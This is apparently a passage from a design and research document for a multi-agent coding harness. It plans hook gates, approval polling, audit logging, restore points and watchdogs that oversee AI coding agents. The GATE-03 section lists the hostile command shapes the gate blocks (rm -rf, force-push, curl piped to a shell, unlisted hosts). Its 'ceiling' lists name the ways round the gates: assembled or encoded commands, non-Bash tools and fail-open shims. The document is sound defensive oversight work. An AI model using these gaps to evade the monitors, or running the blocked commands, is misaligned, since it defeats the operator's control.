| **claude** | native `--settings` (`agentProvider.ts:229-235`) | `HOOK_SHIM` at `<hive>/bin/cth-hook.cjs` (`hive.ts:801`) | **Yes** — reads reply, writes to stdout (`hiveTemplates.ts:341-345`) | **Yes — 2.1.236** | **Yes** |
| **codex** | `hookBridge:'codex'` (`:287`) | `HOOK_SHIM` **verbatim**, per-agent `CODEX_HOME/hooks.json` (`hive.ts:1017`) | **Yes** | **Yes — codex-cli 0.128.0, logged in via ChatGPT** | **Yes — and it is the only non-Claude engine that is** |
| **grok** | `hookBridge:'grok'` (`:320`) | **`GROK_HOOK_SHIM`** at `hiveTemplates.ts:730`, written `hiveProvisioning.ts:420` — a *translator*, not `HOOK_SHIM` | **Yes** — maps `permissionDecision:'deny'` → `{decision:'deny'}` (`:779-781`) | **No** | **No — CLI absent + needs an xAI key** |
| **kimi** | `hookBridge:'kimi'` (`:351`) | `HOOK_SHIM` verbatim via `--config-file` (`hiveProvisioning.ts:242-296`) | **Probably** — but `hiveTemplates.ts:293-297` records that Moonshot documents a BLOCK as **exit code 2** where this shim expresses deny via stdout JSON at exit 0. Open. | **No** | **No** |
| **antigravity (agy)** | `hookBridge:'agy'` (`:377`) | `AGY_HOOK_SHIM` at `hiveTemplates.ts:364`, written `hiveProvisioning.ts:124` | **Yes** — preset comment `:378` says "verified agy honors hook decisions" | **No** | **No** |
| **pi** | `bridge:{kind:'hooks',shim:'pi'}` (`:556`) | `PI_EXTENSION` at `hiveTemplates.ts:425` | **No** — `post()` is `c.end(...)` with no reply read (`:436-437`). But `ev.approve()` exists and the handler's return value is consumed (`:443-446`) | **No** | **No — build it, mark `LIVE-UNVERIFIED`** |
| **opencode** | `bridge:{kind:'hooks',shim:'opencode'}` (`:440`) | `OPENCODE_PLUGIN` at `hiveTemplates.ts:466` | **Unknown** — `'tool.execute.before'` is already `async` (`:490`) but whether returning/throwing vetoes is undocumented here | **No** | **No — build against the documented API, mark `LIVE-UNVERIFIED`** |
| **qwen** | `bridge:{kind:'proxy'}` (`:404`) | `PROXY_BRIDGE_SHIM` `hiveTemplates.ts:505` | **No tool-call boundary exists** (`hooks.ts:60-62`) | **No** | Out of scope (Deferred) |
| **crush** | `bridge:{kind:'proxy'}` (`:509`) | same | **No** | **No** | Out of scope |
| **copilot** | none (`:574-599`) | — | No bridge at all | CLI stub present, reports "Cannot find GitHub Copilot CLI" | No |
| **custom** | none (`:601`) | — | No bridge | n/a | n/a |

**Consequence for the SUMMARY, stated so the planner does not have to discover it.** CONTEXT.md D-06's binding wording — *"refused for Codex and Grok (live-verified), for pi (built, live-verified if a pi run is possible), and built-but-LIVE-UNVERIFIED for OpenCode"* — **cannot be written honestly on this machine**, because grok is not installed. The achievable claim is: **refused for Claude and Codex (live-verified on this machine); built for grok, kimi and agy against their shipped shims and unit-verified through the real `HookServer`, LIVE-UNVERIFIED for want of an installed CLI; built and LIVE-UNVERIFIED for pi and OpenCode.** That is five more engines than `AGENT_DENY_RULES` reaches and it is the truth.

---

## Architecture Patterns

### System architecture — the two data flows this phase adds

```
                              ┌──────────────────────────────────────────┐
   agent PTY (any engine)     │            ELECTRON MAIN                 │
   ┌───────────────┐          │                                          │
   │ engine CLI    │          │  PtyManager.spawn ── env allowlist ──────┼── GATE-02
   │   ↓ tool call │          │    (pty.ts:745-751)                      │
   │  shim/plugin  │          │                                          │
   └──────┬────────┘          │  HookServer.listenOn (hooks.ts:586)      │
          │ 1 JSON line       │    conn.on('data') → authorized()        │
          ├──────────────────►│      ↓ agentId from per-agent token      │
          │  UDS / named pipe │    handle(p, agentId)  (hooks.ts:1188)   │
          │                   │      │                                   │
          │                   │      ├─► [NEW] recordToolCall ───────────┼── RECORD-01
          │                   │      │     agent+ts+tool+target          │      ↓
          │                   │      │                                   │  PersistStore
          │                   │      ├─► protectedPathDenial (:1369)     │  (db.ts)
          │                   │      │     hive paths — GATE-01          │      ↑
          │                   │      ├─► [NEW] commandShapeDenial ───────┼── GATE-03
          │                   │      │     rm -rf / push +main /         │      │
          │                   │      │     curl|sh / host allowlist      │      │
          │                   │      ├─► toolDecision (:1388)            │      │
          │◄─────────────────┤      │     paused / gated                │      │
          │  allow | deny |   │      └─► [NEW] askDecision ──────────────┼── GATE-05
          │  {pending,askId}  │            registry, TTL, verdict        │      │
          │                   │              │                          │      │
   ┌──────▼────────┐          │              ├─► openAsks() merge ───────┼──► GET /phone/api/asks
   │ shim polls    │──────────┤              ├─► Notification (:4781)    │    POST /phone/api/answer
   │ until verdict │  N × short│              └─► push.ts (VAPID)        │
   │ or deadline   │  connects │                                          │
   │  → DENY       │          │  DeliveryService.tick (delivery.ts:759)  │
   └───────────────┘          │    quiesce(live, now)  ── [NEW] blocked ─┼── VIGIL-03
                              │      guard before setStatus(:740)        │
   hive/log.jsonl ────────────┤  hive.appendLog (:2485) ──[NEW] mirror ──┼── RECORD-02
                              │                                          │      ↓ PersistStore
   operator's project repo    │  floor scheduler (boot.ts)               │
   ┌───────────────┐          │    ├─ [NEW] absenceWatchdog ─────────────┼── VIGIL-01
   │  work tree    │◄─────────┤    │    lastOutputAt ∧ ledger ∧ router    │
   │  .git  (never │  git      │    │    edge-trigger + latch             │
   │       touched)│  --git-dir│    └─ [NEW] restorePointTimer ──────────┼── RECORD-05
   └───────────────┘  =restore │         snapshot → <hive>/restore.git   │
                       .git    │                                          │
                              │  teardownPty (lifecycle.ts:222) ─────────┼── VIGIL-02
                              │    after setArchived → release card       │
                              └──────────────────────────────────────────┘
```

Two properties the diagram is drawn to make visible: **every new judge is inside `handle`**, on the one connection every engine already opens; and **nothing new types into a PTY** — GATE-05's answer rides the hook return, exactly as ADR-0001 requires and as `control.ts`'s own header describes.

---

### Pattern 1 — GATE-02: filter the base spread, not the layered env

**What:** `pty.spawn`'s env is built as `{ ...process.env, PATH, TERM, …locale…, ...opts.env, ...hookToken, ...otelToken }` (`pty.ts:749-790`). Replace `...process.env` with `...allowFromEnv(process.env, extraPassThrough)`. Everything the hive itself sets arrives in `opts.env` **after** the spread and is unaffected.

**Verified this session (win32, 114 vars in this shell):** `SystemRoot`, `ComSpec`, `PATHEXT`, `TEMP`, `TMP`, `USERPROFILE`, `windir`, `SystemDrive`, `HOMEDRIVE`, `HOMEPATH`, `USERNAME`, `NUMBER_OF_PROCESSORS`, `PROCESSOR_ARCHITECTURE`, `OS`, `APPDATA`, `LOCALAPPDATA`, `PUBLIC`, `ALLUSERSPROFILE`, `ProgramData`, `ProgramFiles`, `ProgramFiles(x86)`, `CommonProgramFiles` are all present. A `spawnSync` of `node -e` and of `cmd.exe /d /s /c echo hi` **both survived an entirely empty env** — so the win32 minimum for *process creation* is smaller than feared. That is not the constraint that matters, though: the constraint is **what an engine CLI needs to find its own credentials**, which is `USERPROFILE`/`APPDATA`/`LOCALAPPDATA` (and `HOME` on POSIX). Drop those and every engine silently logs out.

**The hive's own names, enumerated from source** (all arrive via `opts.env`, so they need no allowlist entry, but the D-12 positive-lower-bound assertion should name them): `AGENT_ID`, `HIVE_ROOT`, `HIVE_SOCK`, `HIVE_SOCK_TOKEN`, `HIVE_NODE`, `HIVE_AUTO_APPROVE`, `HIVE_PROXY_API`, `HIVE_PROXY_SESSION`, `CODEX_HOME`, `CRUSH_GLOBAL_CONFIG`, `CRUSH_GLOBAL_DATA`, `OPENCODE_CONFIG_DIR`, `PI_CODING_AGENT_DIR`, `CLAUDE_CODE_ENABLE_TELEMETRY`, `OTEL_*` (six of them, `hive.ts:1123-1135`).

```ts
// Sketch. The allowlist is EXACT names plus two prefix families; nothing else survives.
const ENV_ALLOW = new Set([
  'PATH', 'TERM', 'SHELL', 'ComSpec', 'PATHEXT', 'OS',
  'HOME', 'USERPROFILE', 'HOMEDRIVE', 'HOMEPATH', 'USERNAME', 'USER', 'LOGNAME',
  'TMP', 'TEMP', 'TMPDIR',
  'SystemRoot', 'SystemDrive', 'windir', 'APPDATA', 'LOCALAPPDATA', 'ProgramData',
  'ProgramFiles', 'ProgramFiles(x86)', 'CommonProgramFiles', 'ALLUSERSPROFILE', 'PUBLIC',
  'NUMBER_OF_PROCESSORS', 'PROCESSOR_ARCHITECTURE',
  'LANG', 'LC_ALL', 'LC_CTYPE', 'TZ'
]);
const ENV_ALLOW_PREFIX = ['LC_', 'HIVE_'];   // locale families; hive vars belt-and-braces
```

**Ceiling (D-34) this gate must ship:** (a) it bounds the *initial* env only — an agent that `export`s a secret it read from a file, or that reads `~/.aws/credentials` directly, is untouched; (b) `PATH` survives by necessity, so anything reachable on `PATH` is reachable; (c) the operator's additive pass-through list is by construction a hole they opened knowingly; (d) grandchildren inherit whatever the agent sets; (e) on win32 env names are case-insensitive to the OS but `Set.has` is case-sensitive — the filter must normalize or it will silently drop `Path` on a machine that spells it that way. **(e) is a real bug shape, not a hypothetical.**

---

### Pattern 2 — GATE-03: a second judge over the *same* tokens

**What:** `protectedPathDenial` already tokenizes. Extract the tokenization, feed two consumers.

```ts
// hooks.ts, inside the `if (event === 'PreToolUse')` block at :1368 —
// BEFORE protectedPathDenial, because protectedPathDenial returns null early
// when no token is path-shaped (hooks.ts:890) and `curl https://x | sh`
// contains no path-shaped word at all.
if (p.tool_name === 'Bash' && typeof ti.command === 'string') {
  const words = this.expandHiveVars(agentId, ti.command).split(/[\s;&|<>()"']+/).filter(Boolean);
  const shape = commandShapeDenial(words, this.getConfig().hostAllowlist);   // pure, electron-free
  if (shape) { /* emitControl + emit(blocked) + return boundDeny-shaped deny */ }
}
```

**Why a separate pure module.** `commandShapeDenial(words, allowlist)` takes an array of strings and a `string[]`, performs no syscalls, imports nothing from electron, and returns `string | null`. That makes it (i) trivially D-33-testable in both directions, (ii) runnable on all three CI platforms without the `load-ts.cjs` electron stub, and (iii) cost-free next to `protectedPathDenial`'s ancestor walks. It is the same discipline `db.ts`'s `ftsMatchTerms` and `clampLimit` already follow.

**The four shapes, judged on tokens rather than prefixes:**

| Shape | Token test (sketch) | Why not a prefix |
|---|---|---|
| `sh -c "rm -rf …"` | any token `rm` **and** a token matching `/^-[a-z]*r[a-z]*$/i` **and** a token matching `/^-[a-z]*f[a-z]*$/i` (or one combined `-rf`), anywhere in the array | catches `sh -c`, `bash -lc`, `env rm`, `sudo rm`, `xargs rm`, and `rm -f -r` |
| `git push origin +main` | token `git` **and** token `push` **and** (any token starting `+` **or** token `--force`/`-f`/`--force-with-lease`) | `+main`, `+refs/heads/main:main`, `--force` all collapse to one rule |
| `curl … \| sh` | a token in `{curl,wget,iwr,irm,Invoke-WebRequest}` **and** the raw command contains a pipe metachar **and** a later token in `{sh,bash,zsh,python,python3,node,perl,ruby,pwsh,powershell}` | the pipe is the tokenizer's own separator, so the *raw* string must be consulted for `\|` presence while the *tokens* supply the two ends |
| host outside allowlist | every token matching `/^[a-z][a-z0-9+.-]*:\/\//i` → parse with `new URL()` → `hostname` not in allowlist ⇒ deny | identity over spelling: `HTTPS://Evil.COM./x` normalizes; a prefix match does not |

**D-05, decided in writing as the CONTEXT requires:** the allowlist reads from config; **an absent, empty, or unparseable allowlist denies every outbound-host token and says so, naming the config key and the fact that it is empty.** Rationale, and it differs from `protectedPathDenial`'s accepted item (i) on purpose: item (i) fails open because *with no hive root there is nothing to protect*, which is a true statement about the world. An empty host allowlist is not a statement that there are no hosts — it is a statement that the operator has told us nothing, and answering "allow" to that is the fail-open that gets re-discovered as a finding. Ship a non-empty default so the failing-closed branch is reached only by someone who deliberately emptied it.

**Suggested default allow set** (derived from what this floor's own agents already need — `hive.ts` OTLP is loopback, so nothing here is speculative): `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `crates.io`, `static.crates.io`, `proxy.golang.org`, `github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`, `codeload.github.com`, `api.anthropic.com`, `api.openai.com`, `api.x.ai`, `generativelanguage.googleapis.com`, `api.groq.com`, `openrouter.ai`, `api.moonshot.cn`, plus `localhost`/`127.0.0.1`/`::1`, plus the git remote's host resolved from `git remote get-url origin`. `[ASSUMED]` — these host names come from training knowledge, not from a doc fetched in this session, and the planner should confirm each against the engine's own docs or simply let the operator's first denial teach them.

**Ceiling (D-34) this gate must ship** — extending `hooks.ts:800-859`'s items (a)-(i) with, at minimum: (j) **runtime-assembled command strings** (`C=rm; $C -rf /`) — the judge reads a string, not a shell; (k) **`cd` then relative invocation** — inherited from item (a); (l) **a harness home containing a space** — inherited from item (b), and it turns this arm off for that operator exactly as it turns the path arm off; (m) **base64 / `eval` / here-doc bodies** — a payload the tokenizer cannot see into; (n) **non-Bash tools** — a `WebFetch` to a denied host is not a Bash command and this arm never sees it; (o) **the seven engines this reaches and the four it does not** (Drift row 13 / §Cross-Engine Reality).

---

### Pattern 3 — GATE-05: poll, do not hold the connection

**The measurement that decides the design.** The server answers by `conn.end(JSON.stringify(res ?? {}))` at `hooks.ts:630` — one write, then close. The three reply-reading shims all accumulate and then parse **at `'end'`**:

- `HOOK_SHIM` (`hiveTemplates.ts:341-345`): `c.on('data', d => resp += d)`; `c.on('end', () => done(0))`; `done` writes `resp` to stdout verbatim.
- `GROK_HOOK_SHIM` (`hiveTemplates.ts:770-784`): `done` runs `JSON.parse(resp || '{}')` over the **whole accumulated buffer**.
- `AGY_HOOK_SHIM` (`hiveTemplates.ts:364-412`): same shape.

So **a "pending" preamble written on the same connection followed by a verdict produces `{"pending":…}{"deny":…}` in `resp`. `JSON.parse` throws, `out` stays null, grok and agy `process.exit(0)` with no stdout — which is *allow*.** A held-open connection is a fail-**open**, silently, on two of the seven engines. That rules out the streaming form regardless of how attractive it looks.

**The design that works with the shims as written:**

1. `handle` stays **synchronous**. It returns one of three things for a PreToolUse: an allow (`{}`), a deny (`boundDeny`-shaped), or an **ask** — a reply that is *simultaneously* a valid deny for an old shim and a pending handle for a new one:

```ts
// One object, two readings. An old shim sees only hookSpecificOutput and denies.
// A new shim sees hive_ask and polls instead.
{
  hookSpecificOutput: {
    hookEventName: 'PreToolUse',
    permissionDecision: 'deny',
    permissionDecisionReason:
      'Approval required and this shim cannot wait for one — denied. ' +
      'Re-run after the floor upgrades its shims (ensureHive rewrites them on boot).'
  },
  hive_ask: { id: '<askId>', deadlineMs: <epoch>, pollMs: 1000 }
}
```

   Old shim → deny. **Fail-closed on the correct side, for free, with no version negotiation.**

2. New shims, on seeing `hive_ask`, discard `resp` and loop: a fresh short connection per poll carrying `{hook_event_name:'ApprovalPoll', ask_id, sock_token}`. Main answers `{status:'pending'}` (loop again), or the final allow/deny (emit and exit).
3. On `Date.now() > deadlineMs`, or on an unknown ask id, the shim **writes the deny JSON to stdout and exits 0**. A silent exit is allow; this must never be silent.
4. A socket that is **gone or refuses** still hits `c.on('error', () => process.exit(0))` — allow, unchanged. D-08's clause 3 holds by construction because the error path is reached *before* any `hive_ask` is ever seen.

**Why this is the lazy option, not the clever one:** `handle` has ~30 return points across `hooks.ts:1188-1516`; making it `async` changes the ordering of every side effect in it (`emit`, `emitControl`, `recordSession`, `breaker` feeds) from same-tick to microtask, on every hook event on the floor, to serve one branch. The poll keeps all of that untouched, keeps `conn.setTimeout(HOOK_IDLE_MS)`'s 2 s framing bound meaningful, and keeps the 5 s shim ceiling (`hiveTemplates.ts:347`) untouched for every ordinary call — which is precisely what D-08 asks for.

**The two deadlines, reconciled (D-08's explicit requirement):**

| Bound | Today | Under GATE-05 | Why |
|---|---|---|---|
| `HOOK_IDLE_MS` (`hooks.ts:446`) | 2 000 ms | **unchanged** | It bounds *framing*, not decisions; every poll is a fresh short connection well inside it |
| `HOOK_SHIM` exit timer (`hiveTemplates.ts:347`) | 5 000 ms → allow | **unchanged for the non-ask path**; armed per-poll-connection, and *replaced* by `deadlineMs` → **deny** once `hive_ask` is seen | The 3 s margin `hooks.ts:440-445` reasons about is preserved exactly |
| Ask TTL (new) | — | planner's number; **must be ≤ `deadlineMs` handed to the shim** and the server must expire the registry entry itself | If the registry outlives the shim's deadline, an operator's late "yes" answers a question whose asker already denied and moved on |

**Recommended TTL:** 120 s. `[ASSUMED]` — it is long enough for a phone push to arrive and be tapped and short enough that a worker is not wedged for a coffee break, but no measurement in this session supports the number and the CONTEXT explicitly leaves it to the planner.

**Ceiling (D-34) this gate must ship:** (a) the deny-on-timeout only binds engines whose shim polls — pi and OpenCode get the *first* reply's deny and never poll, so for them "ask" degrades to "deny", which is the safe side but is not the third answer; (b) an app restart mid-ask loses the in-memory registry and the next poll denies — deliberate, and it is the "asked and nobody answered" case, not the "floor is down" case; (c) an agent that never runs a *hook-bridged* tool is not asked about anything; (d) `--permission-mode bypassPermissions` still suppresses Claude's own prompt, so this gate is the only thing between the model and the command — which is why (a) must be written down rather than implied.

---

### Pattern 4 — RECORD-01: the writer hangs off the hook socket

**Three measured reasons the telemetry path cannot carry this requirement:**

1. **No target.** `ToolSpan` (`telemetry.ts:97-107`) is `{agentId, sessionId, ts, tool, success, durationMs, decision?, error?}`. There is no file path and no command.
2. **No target available upstream either.** The span is built at `telemetry.ts:535-544` from `flattenAttrs(lr.attributes)`, and `flattenAttrs` (`:682-690`) drops every key not in `ATTR_ALLOWLIST` (`:676-680`), whose only tool-related member is `tool_name`. Widening the allowlist would be widening a list whose stated purpose (`:670-675`) is keeping PII out.
3. **Claude only.** `hive.ts:1122` gates the whole OTel env block on `if (claudeProvider && this._otelEndpoint)`, and `pty.ts:742` records the same fact ("hive.ts sets it for claude agents with telemetry on, and for nobody else").

**Where the data actually is:** `HookPayload` (`hooks.ts:86-116`) carries `tool_name` and `tool_input`; `protectedPathDenial` already reads `file_path`, `path`, `notebook_path` and `command` out of `tool_input` at `hooks.ts:865-889`. `agentId` is derived from the per-agent token by `authorized()` (`hooks.ts:626`) — i.e. **GATE-01's guarantee is already applied** before the writer would see it, which is exactly the Phase 1 dependency ROADMAP.md names.

**Schema sketch — one migration, appended as `MIGRATIONS[2]` → `user_version 3`:**

```sql
CREATE TABLE IF NOT EXISTS tool_calls (
  id       INTEGER PRIMARY KEY AUTOINCREMENT,
  agent_id TEXT    NOT NULL,
  ts       INTEGER NOT NULL,          -- epoch ms, like command_history.ts
  tool     TEXT    NOT NULL,
  target   TEXT,                      -- file_path / path / notebook_path / command, truncated
  decision TEXT,                      -- 'allow' | 'deny' | 'ask' — GATE-03/05's verdict, free here
  reason   TEXT                       -- the operator-legible deny reason, when denied
);
CREATE INDEX IF NOT EXISTS idx_tc_agent_ts ON tool_calls(agent_id, ts DESC);  -- RECORD-01's query
CREATE INDEX IF NOT EXISTS idx_tc_ts       ON tool_calls(ts);                 -- RECORD-02/SCALE-03 day scan
```

`(agent_id, ts DESC)` is deliberately the same index shape `command_history` already carries at `db.ts:77` — "who wrote this file, and what did the floor run overnight" is that index read two ways.

**Volume and batching.** A busy floor is ~10 agents; a fast agent emits on the order of one tool call every few seconds. Call it 10 agents × 20/min = **200 rows/min ≈ 288 k rows/day** as a pessimistic ceiling. That is trivially within SQLite's reach, but two things in the current code would make it wasteful: `db.ts` calls `this.db.prepare(...)` **on every single call** (`addHistory` at `:194`, `listHistory` at `:203`), and `synchronous = NORMAL` + WAL (`db.ts:139-140`) already means each `INSERT` is one WAL append rather than an fsync. Recommendation: **cache the prepared statement on the `PersistStore` instance** (one `Statement` reused), and **do not add a batching queue** — an unbatched prepared insert under WAL is single-digit microseconds and a queue is a buffer that is empty after the crash this requirement exists for. If a measurement later shows contention, `db.transaction()` over a 100 ms flush window is the upgrade path, and it costs exactly the durability RECORD-01 is about. *(ponytail: no queue until measured.)*

**ADR-0005 is not at risk here, and it is worth saying why.** ADR-0005 governs *cumulative* cost samples — diff, never sum. `tool_calls` rows are **discrete events**, not snapshots; `COUNT(*)` and `ORDER BY ts` are the only aggregations, and neither is a sum over a cumulative series. The place ADR-0005 *could* be re-broken is if a plan opportunistically folds `cost-ledger.jsonl` into the same migration — which the Deferred list already forbids.

---

### Pattern 5 — RECORD-02: a day is a range scan

`appendLog` (`hive.ts:2485-2508`) writes `{ts: Date.now(), ...event}` newline-delimited and rotates one generation at 8 MiB (`:2494-2504`). The requirement is that a day crossing 16 MiB is still whole.

**Recommendation: mirror, do not move.** Keep the `appendFileSync` exactly as it is — it is the crash-safe path, it is what `logTail` reads, and it is one line inside a `try`. Add a second, best-effort `persist.appendEvent(...)` beside it. Two reasons: (1) the JSONL is durable *before* the process could return, whereas a SQLite write under `synchronous = NORMAL` is durable at the next WAL checkpoint — belt-and-braces is genuinely worth its two lines here; (2) it makes the change additive and reversible, so a plan that gets the schema wrong has not also destroyed the event log.

```sql
CREATE TABLE IF NOT EXISTS events (
  id   INTEGER PRIMARY KEY AUTOINCREMENT,
  ts   INTEGER NOT NULL,
  kind TEXT    NOT NULL,        -- hive.ts's own `kind` field; ~20 distinct values in source
  json TEXT    NOT NULL         -- the whole event, verbatim, so nothing is lost to a schema guess
);
CREATE INDEX IF NOT EXISTS idx_ev_ts ON events(ts);          -- D-19: a day is one range scan
CREATE INDEX IF NOT EXISTS idx_ev_kind_ts ON events(kind, ts);
```

**Retention as a query bound (D-18):** `DELETE FROM events WHERE ts < ?` with a day-count bound, run once at boot and once a day off the same scheduler slot as the watchdog. **Recommended default: 30 days.** `[ASSUMED]` — the CONTEXT explicitly leaves the number to the planner; 30 is chosen because SCALE-04's daily digest and SCALE-03's replay both read "yesterday", and because 288 k rows/day × 30 is still under ~10 M rows, which SQLite handles without a thought.

**`UNTRACK_PATHS` coordination (D-18's own warning):** the SQLite file lives at `app.getPath('userData')/harness.db` (`db.ts:129`), which is **outside the hive root entirely** — so it is not in the hive repo, not swallowed by `git add -A`, and needs **no** `UNTRACK_PATHS` entry. `log.jsonl` and `log.jsonl.1` stay listed at `gitCommitter.ts:82` unchanged. This is a simplification the CONTEXT does not claim and the planner should not miss.

---

### Pattern 6 — RECORD-05: measured end-to-end on this machine

Two probe scripts were run in this session against `git version 2.52.0.windows.1` on Windows 11. Full transcripts are reproducible from `C:\Users\Alienware\AppData\Local\Temp\gsd-record05-probe.sh` and `gsd-record05-probe2.sh`.

**The command form that works:**

```bash
git init -q --bare "<hive>/restore.git"

G="git --git-dir=<hive>/restore.git --work-tree=<operator-repo>
   -c core.autocrlf=false -c core.safecrlf=false -c core.longpaths=true
   -c user.email=hive@local -c user.name=hive"

$G add -A                       # honours the OPERATOR's .gitignore automatically
$G commit -q -m "restore-point <iso>"
$G checkout <snapSha> -- <one/file.ts>     # per-file restore
```

**Measured results:**

| Assertion | Measured |
|---|---|
| Operator `git rev-parse HEAD` across snapshot | `689d431…` → `689d431…` — **identical** |
| Operator `git status --porcelain` across snapshot | `[]` → `[]` — **identical** |
| Operator branches across snapshot | `master` → `master` — **identical** |
| Operator `git reflog` line count | 1 → 1 — **identical** |
| Operator `.git/` gains anything | no `restore*` entry — **nothing added** |
| `GIT_INDEX_FILE` needed? | **No.** `--git-dir=restore.git` makes the index default to `restore.git/index`; probe G confirmed `restore.git/index` exists and the operator's is untouched. **D-20's `GIT_INDEX_FILE` is belt-and-braces, not a requirement.** |
| Operator's `.gitignore` honoured | `build/` (gitignored) produced **0** entries in the snapshot — **RECORD-05's `UNTRACK_PATHS` warning is satisfied structurally** |
| Per-file restore leaves neighbours | restored `a.txt`; `b.txt`=`b2-agentB`, `c.txt`=`c2-agentC` — **untouched** |
| Dedup | two snapshots of four files → **10 objects, 80 KiB**; content-addressed |
| `git gc` on the bare store with no work-tree | exit 0; `in-pack: 3, packs: 1` |
| Pruning by `update-ref` to an older commit | 3 commits → **2 reachable** |
| CRLF | `-c core.autocrlf=false` suppressed the "LF will be replaced by CRLF" warning the operator's own `git add` emitted — **bytes preserved both directions** |

**Three failure modes the CONTEXT does not name — all reproduced, all designable-around.** See Landmines **L-06** and **L-07**.

**Directory name (D-21's collision):** `backups` is taken by `reflect.ts:263` and pruned by `pruneBackups` (`reflect.ts:552`, `KEEP_BACKUPS` at `:47`). Use **`restore.git`** at the hive root. It needs **both** an `UNTRACK_PATHS` entry (`gitCommitter.ts:82` → `['cost-ledger.jsonl','log.jsonl','log.jsonl.1','backups','restore.git']`) **and** an ignore-seed entry (`hive.ts:782-792`'s `want` array → add `'restore.git/'`), because `gitCommitter.ts:150-152`'s own comment says a `.gitignore` line does nothing to a file git already tracks.

**Pruning stays fail-safe per ADR-0003:** the bias is *when we cannot prove work is safe to discard, we keep it*. Concretely: prune by **count of restore points**, never by disk size; never run `gc --prune=now`; and skip the prune entirely if the ref-update fails rather than falling back to a delete. A restore store that grew too large is an inconvenience; one that pruned the 02:00 snapshot the operator wanted is the failure the requirement exists to prevent.

---

### Pattern 7 — VIGIL-01: the watchdog lives in the boot seam

**Where.** `floor/boot.ts` owns the module-level `let` block (`:150-180`) and the `Floor` interface (`:97-146`) whose `shutdown` is documented as "the exact inverse of construction. #34 — ONE list". A `setInterval` created in `bootFloor` and cleared in `shutdown` alongside `fleetTimer` (`boot.ts:155`) and `breakerBeatTimer` (`:156`) is the established shape. It survives the god's death because it is not the god, and it survives a closed window because `floor/headless.ts` boots the same floor with no renderer.

**The three-part quiet test (D-24), with the reads already available:**

| Signal | Read | Note |
|---|---|---|
| No card advances | max `updatedAt` over `hive.tasks()` | **Depends on VIGIL-04's `updatedAt`** — see Sequencing S-5 |
| No mail routes | `hive.routeOnce()`'s last non-zero return, or the last `kind:'message'`/`kind:'drain'` append | `appendLog` sites at `hive.ts:1377`, `:1641` |
| No spend lands | `telemetry` last sample ts | already tracked per session (`telemetry.ts:571`) |
| No PTY output | `ptyManager.idleFor(id)` (`pty.ts:940-945`) across live agents | the one the heartbeat already reads |

**The latch (D-25):** edge-trigger on the transition into quiet; store `{since, inFlight}` where `inFlight` is a snapshot of `status==='doing'` cards and their assignees taken *at the transition*; clear the latch on the first real activity. `DeliveryService`'s `quiesced: Set<string>` (`delivery.ts:270`, cleared at `:735` when an agent is no longer quiet) is the in-repo model for exactly this.

**Do not reuse `HEARTBEAT_MISSION`.** Confirmed at `config.ts:95-107`: `to: 'god'`, `enabled: false`, and the doc at `:85-94` says it "types into god's PTY". D-23 is right and the source agrees.

---

### Pattern 8 — VIGIL-02: release in the same tick

`teardownPty` (`lifecycle.ts:222-252`) runs `integrationBroker.revoke` → `breaker.forget` → `control.forget` → `telemetry.forget` → `stopProxyBridge` → `setArchived(agentId, true)` (`:232`) and touches the ledger not at all. Insert immediately after `:232`.

**The two facts VIGIL-02 must name are both in scope but not both synchronously:**
- *Who dropped it* — `agentId`, in hand at `:224`.
- *Where their branch is* — `worktreeHasUnintegratedWork(wtPath, baseBranch)`, but it is reached only inside `finalizeAgentWorktree` (`:196-214`) which is fired with `void` at `:247` and is `async` (it shells git via `git.ts:10`'s `spawn`). **So the branch fact is not available in the same tick as the card release.** See Landmine L-09 for the two ways out.

**Route the ledger write through `bin/task.cjs`** (`hive.ts:807` writes it; PROTOCOL.md names it the only sanctioned writer; `hive.ts:2139` notes the `tasks.lock` `O_EXCL` file is *shared with* `bin/task.cjs`). A direct `tasks.json` rewrite from main would be the exact concurrent-writer bug the god's own prompt warns about at `hive.ts:1471`.

---

### Pattern 9 — VIGIL-03: the guard belongs in main, at `delivery.ts:740`

**This is the phase's most misread item, and it is more misread than D-28 says.**

```ts
// src/main/delivery.ts:713-753  (abridged, verbatim structure)
private quiesce(live: LiveAgentPty[], now: number): void {
  for (const a of live) {
    const level = this.deps.breakerLevel?.(a.agentId);
    if (level === 'constrained' || level === 'stopped') continue;   // :727
    if ((this.bootGraceUntil.get(a.ptyId) ?? 0) > now) continue;    // :730
    const painted = a.hasOutput && a.lastOutputAt > 0;              // :738
    const quiet = painted && now - a.lastOutputAt > QUIESCE_IDLE_MS;
    if (!quiet) { this.quiesced.delete(a.agentId); continue; }
    if (this.quiesced.has(a.agentId)) continue;
    this.quiesced.add(a.agentId);
    this.deps.setStatus?.(a.agentId, 'idle');                       // :740  ← NO BLOCKED CHECK
    this.deps.emit('hive:hookEvent', { …, synthesized: true });     // :752
  }
}
```

`setStatus` is documented at `delivery.ts:117-120` as "**the DURABLE half** of a quiesce transition… this one has to work with the window closed". `stopArmDecision` (`useHive.ts:169`) guards only what the renderer does with the `synthesized: true` event emitted on the *next line*. So on a headless floor the guard does not exist at all, and on a windowed floor the durable status is already `idle` before the renderer ever gets a say.

And then the agent is mailed more work: `tick()`'s wake nudge (`delivery.ts:770-806`) filters on `switching` (`:771`), `paused` (`:772`), `vetoed` (`:773`), boot grace (`:774`) and `idleMs < IDLE_MS` (`:778`) — **and never on status**. Both halves of VIGIL-03's clause fail on the main path today.

**The fix, in order of what it closes:**

1. Add `blocked: boolean` to `LiveAgentPty` (`delivery.ts:68-80`, beside `hasOutput` and `lastOutputAt`, whose own doc comments explain why each exists — follow that style).
2. Guard `quiesce`: `if (a.blocked) { this.quiesced.delete(a.agentId); continue; }` before `:740`. Delete-and-continue, not just continue, so the agent re-announces cleanly when it unblocks.
3. Populate `blocked` from main-side detection: tap `proc.onData` (`pty.ts:826`) — or, lazier and with a house precedent at `terminalPool.ts:412-422`, poll `ptyManager.outputTail(id)` (`pty.ts:930`, a 256 KiB main-side ring that fills whether or not a renderer is attached, `pty.ts:64-77`) from the tick that already runs.
4. Move `BLOCK_HINTS` (`usePtyParser.ts:31`) into a shared, electron-free module so main and renderer evaluate one list. Carry its documented false positive (an agent that merely *echoes* a yes/no prompt reads as blocked, `useHive.ts:140-144`) and its recovery path ("its next real turn-end") **with** the code — it is inherited, not introduced.
5. Only then is `stopArmDecision` reachable for an off-screen agent, which is D-28's point.

**Testability note that should drive the slice:** step 2 alone is a two-line change to a file with an existing test (`test/delivery-main.test.cjs`, `test/queue-delivery.test.cjs`) and can be proven with a fake `liveAgents()` returning `blocked: true` — no PTY, no renderer, no electron. Step 3 is the risky half. Slice them apart.

---

